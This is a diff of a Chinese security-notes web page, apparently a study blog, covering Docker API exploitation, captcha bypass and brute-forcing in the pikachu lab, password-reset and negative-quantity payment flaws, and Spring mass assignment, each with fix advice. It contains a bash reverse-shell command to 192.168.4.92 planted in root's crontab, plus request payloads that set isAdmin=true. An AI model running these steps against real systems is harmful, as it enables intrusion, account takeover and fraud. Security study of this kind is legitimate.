 #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-bash -c "bash -i  &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+bash -c "bash -i  &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1"</code></pre>
 <p>之后给 <a target="_blank" rel="noopener" href="http://wxiao.sh">wxiao.sh</a> 添加执行权限，并且写入到定时任务中</p>
-<pre class="line-numbers language-none"><code class="language-none">chmod +x wxiao.sh 
+<pre><code class="hljs plaintext">chmod +x wxiao.sh 
 
 echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
-#每分钟执行一次wxiaoge.sh 文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+#每分钟执行一次wxiaoge.sh 文件</code></pre>
 <p>kali打开监听端口</p>
-<p><img src="image-20230708205907242.png" alt="image-20230708205907242"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708205907242.png" alt="image-20230708205907242"></p>
 <p>一分钟后成功返回 shell</p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://www.modb.pro/db/152994">https://www.modb.pro/db/152994</a></p>
 <p><strong>漏洞修复：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1.关闭2375端口 （尤其是公网情况下一定要禁用此端口）
-2.在防火墙上配置禁止外网访问2375端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="2-5-图形验证码漏洞">2.5 图形验证码漏洞</h3>
+<pre><code class="hljs plaintext">1.关闭2375端口 （尤其是公网情况下一定要禁用此端口）
+2.在防火墙上配置禁止外网访问2375端口</code></pre>
+<h3 id="25-图形验证码漏洞">2.5 图形验证码漏洞</h3>
 <h4 id="1-图形验证码突破">1. 图形验证码突破</h4>
 <p>漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击</p>
 <p>漏洞原理：</p>
@@ -827,29 +540,29 @@ echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
 以下为验证码固定问题测试过程和源码分析。</p>
 <p><strong>测试过程</strong></p>
 <p>输入不正确的账户/密码及正确的验证码测试</p>
-<p><img src="image-20230720085106759.png" alt="image-20230720085106759"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720085106759.png" alt="image-20230720085106759"></p>
 <p>重复提交该数据包均只返回用户名或密码错误，说明存在验证码固定漏洞。</p>
-<p><img src="image-20230720091018964.png" alt="image-20230720091018964"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720091018964.png" alt="image-20230720091018964"></p>
 <p>所以我们可利用此漏洞绕过验证码直接对用户名和密码进行暴力破解。</p>
 <p><strong>源码分析</strong></p>
 <p>文件：\vul\burteforce\bf_server.php<br>
 关键代码：</p>
-<p><img src="image-20230720091259221.png" alt="image-20230720091259221"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720091259221.png" alt="image-20230720091259221"></p>
 <p>在用户名、密码和验证码均不为空的情况下判断输入验证码是否与生成后保存在session中的验证码相同，但比较完后没有删除该session[vcode],导致下一个数据包输入该验证码也会判断正确，出现验证码重复使用问题。</p>
 <p>凭借此漏洞，我们可以对用户名与密码进行爆破，验证码随意即可（但要保证该验证码是在校验页面出现过的验证码）</p>
 <h6 id="pikachu-on-client">pikachu-on client</h6>
 <p><strong>测试过程</strong></p>
 <p>通过查看源码发现前端JS判断验证码是否正确，所以先输入正确的验证码绕过前端判断。<br>
 输入不正确的账户/密码及验证码进行抓包测试。</p>
-<p><img src="image-20230720091942472.png" alt="image-20230720091942472"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720091942472.png" alt="image-20230720091942472"></p>
 <p>由于已经绕过前端js对验证码的判断，可以将请求包中的验证码参数删除。（可以删除vcode参数）</p>
-<p><img src="image-20230720092032392.png" alt="image-20230720092032392"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720092032392.png" alt="image-20230720092032392"></p>
 <p>再将数据包发送到intruder对用户名和密码进行暴力破解即可。</p>
 <p><strong>源码分析</strong></p>
-<p><img src="image-20230720092457746.png" alt="image-20230720092457746"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720092457746.png" alt="image-20230720092457746"></p>
 <p>可以看到这里进行的前端js校验</p>
 <p>更多参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6971#toc-20">https://xz.aliyun.com/t/6971#toc-20</a></p>
-<h3 id="2-6-找回密码逻辑漏洞">2.6 找回密码逻辑漏洞</h3>
+<h3 id="26-找回密码逻辑漏洞">2.6 找回密码逻辑漏洞</h3>
 <h4 id="1-密码找回漏洞">1. 密码找回漏洞</h4>
 <p>漏洞介绍：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全</p>
 <p>漏洞原理：其实是验证码漏洞的一种：</p>
@@ -867,22 +580,22 @@ echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
 <h6 id="登录密码重置漏洞-墨者学院">登录密码重置漏洞-墨者学院</h6>
 <p>靶场地址：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH</a></p>
 <p>打开靶场界面如下：</p>
-<p><img src="image-20230720094805950.png" alt="image-20230720094805950"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720094805950.png" alt="image-20230720094805950"></p>
 <p>1、通过“朝阳群众”的举报，证实手机号“17101304128”在系统平台从事非法集资、诈骗活动。</p>
 <p>2、请重置“17101304128”登录密码，以便登录获取完整的数字证据</p>
 <p>点击进入重置密码，来到密码重置界面</p>
-<p><img src="image-20230720094833341.png" alt="image-20230720094833341"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720094833341.png" alt="image-20230720094833341"></p>
 <p>已注册的手机号为18868345809</p>
 <p>先输入手机号17101304128，输入新密码：图形验证码，点击获取短信验证码</p>
-<p><img src="image-20230720094939479.png" alt="image-20230720094939479"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720094939479.png" alt="image-20230720094939479"></p>
 <p>提示：已发送至该手机，短信已发送有效期为5分钟</p>
 <p>再输入我已注册的手机号18868345809，设置新密码，验证码，获取验证码 得到验证码：<strong>Vxka6a</strong></p>
-<p><img src="image-20230720095004049.png" alt="image-20230720095004049"></p>
-<p><img src="image-20230720095222105.png" alt="image-20230720095222105"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720095004049.png" alt="image-20230720095004049"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720095222105.png" alt="image-20230720095222105"></p>
 <p>漏洞点：他说短信已发送至该手机，可是这手机号也不是我的呀，我并不知道验证码是啥。此时就可以大胆的猜想一下，它这个网站的逻辑会不会出现问题，只是统一验证输入的验证码是否是正确的，而没有对绑定的手机号进行校验。我们可以使用刚才得到的验证码863bTV来尝试重置，成功得到key值。</p>
 <p>第二种做法：先用自身的账号进行密码重置流程，在得到验证码后，bp抓包修改手机号参数（换成目标手机号即可）这样同样可以的到key，两种想法都一样，只不过第二种似乎更好理解</p>
-<h3 id="2-7-业务数据篡改漏洞">2.7 业务数据篡改漏洞</h3>
-<h4 id="1-业务数据篡改（赋值反冲）">1. 业务数据篡改（赋值反冲）</h4>
+<h3 id="27-业务数据篡改漏洞">2.7 业务数据篡改漏洞</h3>
+<h4 id="1-业务数据篡改赋值反冲">1. 业务数据篡改（赋值反冲）</h4>
 <p>漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利</p>
 <p>漏洞原理：</p>
 <p>没有对传输数据添加相关的校验参数</p>
@@ -892,27 +605,27 @@ echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
 <p>对于软件来说，需要保护好内存数据，防止内存数据篡改</p>
 <p>计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改</p>
 <p>先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值）</p>
-<h5 id="dami-cms-0元支付漏洞">dami__cms-0元支付漏洞</h5>
-<p><img src="image-20230720103225959.png" alt="image-20230720103225959"></p>
+<h5 id="dami__cms-0元支付漏洞">dami__cms-0元支付漏洞</h5>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103225959.png" alt="image-20230720103225959"></p>
 <p>直接小p一把梭，注册登录cms看到如上页面</p>
 <p>点击在线充值、我要提现，看到当前余额是0</p>
-<p><img src="image-20230720103328016.png" alt="image-20230720103328016"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103328016.png" alt="image-20230720103328016"></p>
 <p>点击产品展示、大米测试产品</p>
-<p><img src="image-20230720103346717.png" alt="image-20230720103346717"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103346717.png" alt="image-20230720103346717"></p>
 <p>点击立即购买</p>
-<p><img src="image-20230720103404726.png" alt="image-20230720103404726"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103404726.png" alt="image-20230720103404726"></p>
 <p>填写完整送货地址，将付款方式修改为站内扣款</p>
-<p><img src="image-20230720103454420.png" alt="image-20230720103454420"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103454420.png" alt="image-20230720103454420"></p>
 <p>点击提交订单，同时使用burp进行抓包操作</p>
 <p>将<code>qty</code>参数修改为-1，然后点击<code>Forward</code>，并取消抓包</p>
-<p><img src="image-20230720103606923.png" alt="image-20230720103606923"></p>
-<p><img src="image-20230720103812794.png" alt="image-20230720103812794"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103606923.png" alt="image-20230720103606923"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103812794.png" alt="image-20230720103812794"></p>
 <p>可以看到订单已经提交成功了</p>
 <p>此时查看提现页面的余额已经变为6000，也就是将订单中的-6000反加到了账户余额中</p>
 <p>利用0元支付漏洞，在网站商城进行购买操作时，可无需支付货币，对商城造成极大危害。</p>
 <p>应明确业务逻辑，防止出现此情况</p>
-<p><img src="image-20230720103833229.png" alt="image-20230720103833229"></p>
-<h3 id="2-8-执行顺序逻辑漏洞">2.8 执行顺序逻辑漏洞</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230720103833229.png" alt="image-20230720103833229"></p>
+<h3 id="28-执行顺序逻辑漏洞">2.8 执行顺序逻辑漏洞</h3>
 <h4 id="1-执行顺序篡改">1. 执行顺序篡改</h4>
 <p>漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果</p>
 <p>漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付</p>
@@ -921,7 +634,7 @@ echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
 <p>在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作</p>
 <p>也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验</p>
 <p>再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户</p>
-<h3 id="2-9-其他类型逻辑漏洞">2.9 其他类型逻辑漏洞</h3>
+<h3 id="29-其他类型逻辑漏洞">2.9 其他类型逻辑漏洞</h3>
 <h4 id="1-条件竞争漏洞">1. 条件竞争漏洞</h4>
 <p>漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效</p>
 <p>漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞</p>
@@ -949,32 +662,32 @@ echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
 <p>软件框架有时允许开发人员自动将HTTP请求参数绑定到程序变量或对象中，以使开发人员更容易使用该框架开发。这有时会造成伤害。攻击者有时可以使用这种方法来创建，修改，更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象。</p>
 <p>因此就拿Spring MVC中的自动绑定作为举例，假设有一个用户提交基本信息的功能：</p>
 <p>首先看前端html：</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>“addUserInfo”</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>username</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
-     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>phone</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
-     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>email</span> <span class="token attr-name">text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
-     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>submit</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">“addUserInfo”</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">username</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">phone</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">email</span> <span class="hljs-attr">text</span>=<span class="hljs-string">text</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
 <p>很简单，一个form表单，通过post提交username，phone，email到addUserInfo。</p>
 <p>我们看一下用户的实体类：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> userid<span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> phone<span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> email<span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token keyword">boolean</span> isAdmin<span class="token punctuation">;</span>
+<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
+     <span class="hljs-keyword">private</span> String userid;
+     <span class="hljs-keyword">private</span> String username;
+     <span class="hljs-keyword">private</span> String phone;
+     <span class="hljs-keyword">private</span> String email;
+     <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isAdmin;
 
-     <span class="token comment">//Getters &amp; Setters</span>
-   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+     <span class="hljs-comment">//Getters &amp; Setters</span>
+   }</code></pre>
 <p>可以看到User的实体类存在除了username，phone，email还有比较重要的userid和isAdmin参数。</p>
 <p>我们接下来看一下controller层如果利用了自动绑定可以写出的处理方式：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/addUserInfo"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span>
-  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-     userService<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token keyword">return</span> <span class="token string">"successPage"</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = "/addUserInfo", method = RequestMethod.POST)</span>
+  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submit</span><span class="hljs-params">(User user)</span> {
+     userService.add(user);
+     <span class="hljs-keyword">return</span> <span class="hljs-string">"successPage"</span>;
+  }</code></pre>
 <p>针对上述代码，给出GPT回答</p>
-<pre class="line-numbers language-none"><code class="language-none">这段Java代码是一个简单的Spring MVC控制器方法，它处理HTTP POST请求并将用户信息保存到数据库中。让我们逐行来分析它：
+<pre><code class="hljs plaintext">这段Java代码是一个简单的Spring MVC控制器方法，它处理HTTP POST请求并将用户信息保存到数据库中。让我们逐行来分析它：
 
 1. `@RequestMapping(value = "/addUserInfo", method = RequestMethod.POST)`: 这是一个Spring MVC注解，用于将HTTP请求映射到控制器方法。在这里，它将HTTP POST请求映射到"/addUserInfo"路径，表示该方法将处理该路径的POST请求。
 
@@ -984,48 +697,48 @@ echo '*/1 * * * *  /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root
 
 4. `return "successPage";`: 最后，控制器方法返回一个字符串"successPage"。这通常用于将请求的处理结果返回给用户，告诉用户请求已成功处理。在这里，"successPage"可能是一个视图名称，它会被解析为一个实际的页面，展示给用户，用于确认操作已成功完成。
 
-总结：这段代码是一个用于处理HTTP POST请求的Spring MVC控制器方法。它接受一个"user"对象作为参数，将用户信息保存到数据库中，并返回一个名为"successPage"的字符串，用于告知用户操作已成功完成。具体的用户信息保存逻辑和"successPage"页面的展示取决于代码中其他部分，例如"userService"类和视图解析器的配置。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+总结：这段代码是一个用于处理HTTP POST请求的Spring MVC控制器方法。它接受一个"user"对象作为参数，将用户信息保存到数据库中，并返回一个名为"successPage"的字符串，用于告知用户操作已成功完成。具体的用户信息保存逻辑和"successPage"页面的展示取决于代码中其他部分，例如"userService"类和视图解析器的配置。</code></pre>
 <p><strong>潜在危害</strong></p>
 <p>结合上面的demo，我们可以看到，controller层使用的自动绑定对象的方式，也就是使用了post请求的参数直接绑定到了User，虽然前端form表单中仅出现了username，phone，email，但是如果使用burp等工具向addUserInfo发送了</p>
-<pre class="line-numbers language-none"><code class="language-none">POST /addUserInfo
+<pre><code class="hljs plaintext">POST /addUserInfo
 
-username=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+username=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true</code></pre>
 <p>或者</p>
-<pre class="line-numbers language-none"><code class="language-none">POST /addUserInfo
+<pre><code class="hljs plaintext">POST /addUserInfo
 
-username=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+username=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid</code></pre>
 <p>那么如果后续使用了被污染的对象的被污染的属性，那么就会产生一定的安全问题。</p>
 <p>自动绑定漏洞并非仅在Spring MVC中可能出现，只要有自动绑定功能的框架都可能出现这样的逻辑问题。</p>
 <p>但是可能对于大部分安全人员来说，可能面对的是一个黑盒的环境，很难发现controller层或者orm是否存在这样的问题，那么可能就需要多个表单的交叉对比，推测出可能出现问题的点了。</p>
 <p><strong>修复建议</strong></p>
 <p>通用修复方法是：避免将输入直接绑定到域对象，只有用户可以编辑的字段才包含在DTO中。以上文中的deom为例：</p>
